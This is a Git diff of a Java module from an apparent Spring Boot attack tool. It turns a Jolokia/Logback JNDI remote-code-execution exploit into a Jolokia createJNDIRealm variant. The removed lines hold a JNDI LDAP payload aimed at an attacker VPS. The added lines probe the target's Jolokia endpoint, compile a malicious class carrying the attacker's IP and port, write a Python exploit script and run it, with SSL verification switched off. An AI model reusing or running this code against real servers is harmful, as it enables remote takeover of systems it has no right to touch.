@@ -1,13 +1,12 @@
 package src.main.module;
 
+import src.main.LoadLib.ClassCom.ClsComp;
 import src.main.common.UA_Config;
+import src.main.impl.ResultCallback;
 
-import java.io.BufferedReader;
-import java.io.FileWriter;
-import java.io.InputStreamReader;
+import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.util.Base64;
 import java.util.List;
 import java.util.Scanner;
 import java.util.regex.Matcher;
@@ -15,27 +14,25 @@ import java.util.regex.Pattern;
 
 import static src.main.SSLVerify.sslVer.disableSSLVerification;
 
-public class JolokiaLogackRCE {
+public class JolokiaRealmRCE {
     private String address;
     public  String text;
     private String vpsIP;
     private String vpsPort;
-    public String jndipayload = "<configuration>\n" +
-            "    <insertFromJNDI env-entry-name=\"ldap://%s:1389/src.main.template.JNDIObject.JNDIObject\" as=\"appName\" />\n" +
-            "</configuration>";
-    public JolokiaLogackRCE(String address,String vpsIP,String vpsPort){
+
+    public JolokiaRealmRCE(String address, String vpsIP, String vpsPort){
         this.address = address;
         this.vpsIP = vpsIP;
         this.vpsPort = vpsPort;
     }
 
-    public void Result1() {
+    public void Result1(ResultCallback callback) {
         String llib = "jdk";
         String llib1 = "jolokia-core";
         String api = "/jolokia";
         String site = address + "/env";
-        String logbak = "ch.qos.logback.classic.jmx.JMXConfigurator";
-        String reloURL = "reloadByURL";
+        String MBFact = "type=MBeanFactory";
+        String createRe = "createJNDIRealm";
         String ua = "";
         String data = "";
         disableSSLVerification();
@@ -64,10 +61,10 @@ public class JolokiaLogackRCE {
                 Matcher matcher1 = pattern1.matcher(response.toString());
                 if (matcher.find() && matcher1.find()) {
                     text = "当前jdk版本为: " + matcher.group(1);
-                    System.out.println(text);
+                    callback.onResult(text);
                     text = "当前jolokia-core版本为: " + matcher1.group(1);
-                    System.out.println(text);
-                    URL obj1 = new URL(address + "/jolokia/list");
+                    callback.onResult(text);
+                    URL obj1 = new URL(address +  api + "/list");
                     HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                     ua = uacf.getRandomUserAgent(ualist);
                     conn1.setRequestProperty("User-Agent", ua);
@@ -80,37 +77,74 @@ public class JolokiaLogackRCE {
                     while ((inputLine1 = in1.readLine()) != null) {
                         response1.append(inputLine1);
                     }
-                    if (responseCode1 == HttpURLConnection.HTTP_OK && (response1.toString().contains(logbak)) && response1.toString().contains(reloURL)) {
-                        text = "存在 ch.qos.logback.classic.jmx.JMXConfigurator 和 reloadByURL";
-                        System.out.println(text);
-                        FileWriter writer = new FileWriter(System.getProperty("user.dir") + "/resources/JolokiaLogback.xml");
-                        Scanner sc = new Scanner(System.in);
-                        data = String.format(jndipayload, vpsIP);
-                        writer.write(data);
-                        sc.close();
-                        writer.close();
-                        text = "JolokiaLogback.xml文件写入成功";
-                        System.out.println(text);
-
+                    if (responseCode1 == HttpURLConnection.HTTP_OK && (response1.toString().contains(MBFact)) && response1.toString().contains(createRe)) {
+                        text = MBFact + "和" + createRe;
+                        callback.onResult(text);
+                        ClsComp cc = new ClsComp(vpsIP,vpsPort);
+                        // 通用代码
+                        boolean isModify = cc.modifyJavaClassFile("JNDIObject/JolokiaLogbackTemplate.java","JolokiaRealm.java",callback);
+                        if (isModify) {
+                            try {
+                                cc.CompileJava("JolokiaRealm", "JolokiaRealm", callback);
+                            } catch (IOException e) {
+                                return;
+                            }
+                            text = "class文件写入成功";
+                            callback.onResult(text);
+                            ClsComp cc1 = new ClsComp(address,vpsIP,"");
+                            boolean isModify1 = cc1.modifyPythonFile("RealmObject/RealmJolokiaTemplate.py","RealmJolokia.py",callback);
+                            if (isModify1){
+                                text = "py文件写入成功";
+                                callback.onResult(text);
+                                // 默认python3
+                                String pyFilePath = System.getProperty("user.dir") + "resources/RealmJolokia.py";
+                                String pyInterpreter = "python3";
+                                ProcessBuilder processBuilder = new ProcessBuilder(pyInterpreter, pyFilePath);
+                                try {
+                                    Process process = processBuilder.start();
+                                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                                    String line;
+                                    while ((line = reader.readLine()) != null) {
+                                        callback.onResult(line);
+                                    }
+                                    // 等待进程结束并获取退出代码
+                                    int exitCode = process.waitFor();
+                                    text = "Python脚本执行完毕，退出代码: " + exitCode;
+                                    callback.onResult(text);
+                                } catch (IOException | InterruptedException e) {
+                                    e.printStackTrace();
+                                }
+                            }else {
+                                text = "py文件写入失败";
+                                callback.onResult(text);
+                            }
+                        }else{
+                            text = "文件写入失败";
+                            callback.onResult(text);
+                        }
                     }else{
-                        text = "未找到 ch.qos.logback.classic.jmx.JMXConfigurator 和 reloadByURL";
-                        System.out.println(text);
+                        text = "未找到" + MBFact + "和" + createRe;
+                        callback.onResult(text);
                     }
                 }else{
                     text = "未找到依赖";
-                    System.out.println(text);
+                    callback.onResult(text);
                 }
             }else {
                 text = "发起请求失败";
-                System.out.println(text);
+                callback.onResult(text);
             }
         }catch (Exception e){
+            text = "检测依赖异常";
+            callback.onResult(text);
             e.printStackTrace();
         }
     }
-    public void Result2() {
+    public void Result2(ResultCallback callback){
+
     }
-    public void Exp(){
+
+    public void Exp(ResultCallback callback){
         String api = "/actuator/env";
         String site = address + api;
         String ua = "";
@@ -126,27 +160,20 @@ public class JolokiaLogackRCE {
             int responseCode = conn.getResponseCode();
             if (responseCode == HttpURLConnection.HTTP_OK) {
                 text = "当前版本为springboot2";
-                System.out.println(text);
-//                callback.onResult(text);
-                Result2();
+                callback.onResult(text);
+                Result2(callback);
             }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
                 text = "当前版本为springboot1";
-                System.out.println(text);
-//                callback.onResult("当前版本为springboot1");
-                Result1();
+                callback.onResult("当前版本为springboot1");
+                Result1(callback);
             }else{
                 text = "未识别springboot版本";
-//                callback.onResult(text);
+                callback.onResult(text);
             }
         }catch (Exception e){
             text = "检测springboot版本异常";
-//            callback.onResult(text);
+            callback.onResult(text);
             e.printStackTrace();
         }
-    }
-
-    public static void main(String[] args) {
-        JolokiaLogackRCE jl = new JolokiaLogackRCE("http://127.0.0.1:9094","127.0.0.1","80");
-        jl.Exp();
     }
 }
